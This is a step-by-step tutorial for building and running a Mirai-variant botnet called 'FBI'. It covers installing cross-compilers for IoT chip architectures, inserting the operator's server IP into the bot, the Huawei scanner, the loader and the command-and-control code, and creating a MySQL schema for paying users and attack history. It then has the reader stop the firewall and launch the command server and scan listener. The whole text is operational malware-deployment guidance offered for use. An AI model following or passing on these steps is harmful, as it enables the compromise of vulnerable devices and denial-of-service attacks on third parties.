# FBI-BOTNET-MIRAI 
# CentOS 6 required
 ______________________
|                      |
|  Tutorial by FBI
|______________________|

yum update -y
yum install epel-release -y
yum groupinstall "Development Tools" -y
yum install gmp-devel -y
ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y

mkdir /etc/xcompile
cd /etc/xcompile 
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
tar -jxvf cross-compiler-i686.tar.bz2
rm -rf *.tar.bz2
mv cross-compiler-i586 i586
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l
mv cross-compiler-i686 i686
cd /tmp
wget https://dl.google.com/go/go1.9.4.linux-amd64.tar.gz -q
tar -xvf go1.9.4.linux-amd64.tar.gz
mv go /usr/local
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
go version
go env
cd ~/
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords

// Now after that we have to setup the bot.
// You will see " PUT YOUR IP HERE "
// Change that with your server IP.

 CHANGE IP(s) IN /bot/huawei_scanner.c
 CHANGE IP(s) IN /bot/main.c
 CHANGE IP(s) IN /scanListen.go
 CHANGE IP(s) IN /dlr/main.c -> For example your server ip is 127.0.0.1 the format should be (127,0,0,1) replace the . with , 
 CHANGE IP(s) IN /loader/src/headers/config.h
 CHANGE IP(s) IN /loader/src/main.c
 CHANGE IP(s) IN /cnc/main.go


// We will setup the database, run these commands on your terminal:

service mysqld restart
mysql_secure_installation

// Now Login with your mysql pass by running this command:

mysql -u root -p

// Now we will add the database, copy and paste this on your terminal:

CREATE DATABASE FBI;
use FBI;
CREATE TABLE `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);
 
CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);
 
CREATE TABLE `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);
INSERT INTO users VALUES (NULL, 'Username', 'Password', 0, 0, 0, 0, -1, 1, 30, '');
exit;

// Now your database is complete, we will restart and disable services:

service iptables stop 
service httpd restart  
service mysqld restart

// Alright, we have to compile the bot and screen the cnc server by doing this:

cd ~/
chmod 777 *
sh build.sh

nano /usr/include/bits/typesizes.h
scroll down and edit the 1024 to 999999
THEN SAVE IT 
ulimit -n999999; ulimit -u999999; ulimit -e999999


// Now compile the loader
cd loader/
sh build.sh


//Now screen the cnc
cd release/
screen ./cnc

//Then
into the loader directory run:
screen -s scanListen ./scanListen

FBI Mirai Port: 2310
